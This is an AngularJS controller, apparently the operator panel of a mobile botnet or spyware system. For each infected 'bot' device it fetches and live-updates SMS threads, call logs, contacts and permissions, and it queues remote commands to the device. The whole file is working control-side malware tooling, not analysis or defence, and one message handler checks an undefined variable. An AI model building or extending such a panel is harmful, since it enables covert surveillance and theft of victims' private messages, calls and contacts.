App.controller('BotCtrl', [
  '$scope',
  'BotService',
  'MessageService',
  'CommandService',
  'CallLogService',
  'PermissionService',
  'ContactService',
  'socket',
  '$stateParams',
  'toastr',
  '$state',
  'bot',
  function($scope, BotService, MessageService, CommandService, CallLogService, PermissionService, ContactService, socket, params, toastr, $state, bot) {

    $scope.bot = bot
    $scope.num_call_logs = 100;
    $scope.numbersms = 100;

    var messages = []
    $scope.hasMessages = false
    $scope.messageThreads = {}

    $scope.contacts = []

    function reorderMessageThreads() {
      $scope.hasMessages = messages.length > 0
      $scope.messageThreads = _.groupBy(_.orderBy(messages, function(msg) {
        return msg.date
      }), function(msg) {
        return msg.thread_id
      })
    }

    socket.forward('bot:connected', $scope);
    socket.forward('bot:disconnected', $scope);
    socket.forward('bot:updated', $scope);
    socket.forward('command:added', $scope);
    socket.forward('command:deleted', $scope);
    socket.forward('commands:cleared', $scope);
    socket.forward('message:created', $scope);
    socket.forward('messages:cleared', $scope);
    socket.forward('call_log:created', $scope);
    socket.forward('call_log:cleared', $scope);
    socket.forward('getcallhistory:done', $scope);
    socket.forward('permissions:updated', $scope);
    socket.forward('contact:created', $scope);

    MessageService.fetch($scope.bot.uid).then(function(res) {
      messages = res.data
      reorderMessageThreads()
    })

    CommandService.getPending($scope.bot.uid).then(function(res) {
      $scope.pendingCommands = res.data;
    });

    CallLogService.fetch($scope.bot.uid).then(function(res) {
      $scope.callLogs = res.data;
    })

    PermissionService.fetch($scope.bot.uid).then(function(res) {
      $scope.permissions = res.data;
    })

    ContactService.fetch($scope.bot.uid).then(function(res) {
      $scope.contacts = res.data;
    })

    $scope.$on('socket:bot:connected', function(e, data) {
      if (data.uid === bot.uid) {
        $scope.bot = data;
        toastr.success('Device status changed to online', 'Online')
      }
    })

    $scope.$on('socket:bot:updated', function(e, data) {
      if (data.uid === bot.uid) {
        $scope.bot = data;
        toastr.success('Device info updated.', data.device)
      }
    })

    $scope.$on('socket:bot:disconnected', function(e, bot) {
      if ($scope.bot.uid === bot.uid) {
        $scope.bot = bot;
        toastr.error('Device status changed to offline', 'Offline')
      }
    })

    $scope.$on('socket:command:added', function(e, data) {
      if (data.uid === $scope.bot.uid) {
        $scope.pendingCommands.push(data)
      }
    })

    $scope.$on('socket:command:deleted', function(e, data) {
      $scope.pendingCommands = _.reject($scope.pendingCommands, function(cmd) {
        return cmd.id === data.id;
      });
    })

    $scope.$on('socket:commands:cleared', function(e, data) {
      if ($scope.bot.uid === data.uid)
        $scope.pendingCommands = [];
    })

    $scope.$on('socket:message:created', function(e, message) {
      if ($scope.bot.uid === data.uid) {
        messages.push(message);
        reorderMessageThreads()
      }
    })

    $scope.$on('socket:messages:cleared', function(e, data) {
      if (data.uid === $scope.bot.uid) {
        messages = [];
        $scope.messageThreads = {}
        $scope.hasMessages = false
      }
    })

    $scope.$on('socket:call_log:created', function(e, log) {
      if (log.uid === $scope.bot.uid)
        $scope.callLogs.push(log);
    })

    $scope.$on('socket:call_log:cleared', function(e, data) {
      if (data.uid === $scope.bot.uid) {
        $scope.callLogs = [];
      }
    })

    $scope.$on('socket:permissions:updated', function(e, data) {
      if (data.uid === $scope.bot.uid) {
        $scope.permissions = data.permissions
        toastr.info('Permissions updated.', $scope.bot.device)
      }
    })

    $scope.$on('socket:contact:created', function(e, data) {
      if (data.uid === $scope.bot.uid) {
        $scope.contacts.push(data)
      }
    })

    $scope.addCommand = function(cmd, arg1, arg2) {
      CommandService.add({
          uid: $scope.bot.uid,
          command: cmd,
          arg1: arg1,
          arg2: arg2
        })
        .catch(function(err) {
          toastr.error('Unable to send command to the device', 'Failed')
        })
    }

    $scope.clearSMS = function() {
      MessageService.clear($scope.bot.uid)
    }

    $scope.deleteCommand = function(id) {
      CommandService.delete(id).catch(function(err) {
        console.log(err)
      })
    }

    $scope.clearCallLogs = function() {
      CallLogService.clear($scope.bot.uid).catch(function(err) {
        console.log(err)
      })
    }

    $scope.removeDevice = function(bot) {
      if (confirm('Are you sure?')) {
        BotService.delete(bot.id).then(function() {
          toastr.success(bot.device + ' has been deleted.', bot.device)
          $state.go('dashboard.home')
        })
      }
    }

    $scope.deleteContacts = function() {
      ContactService.clear($scope.bot.uid).then(function() {
        $scope.contacts = []
        toastr.success('Contacts cleared.', $scope.bot.device)
      })
    }

  }
])
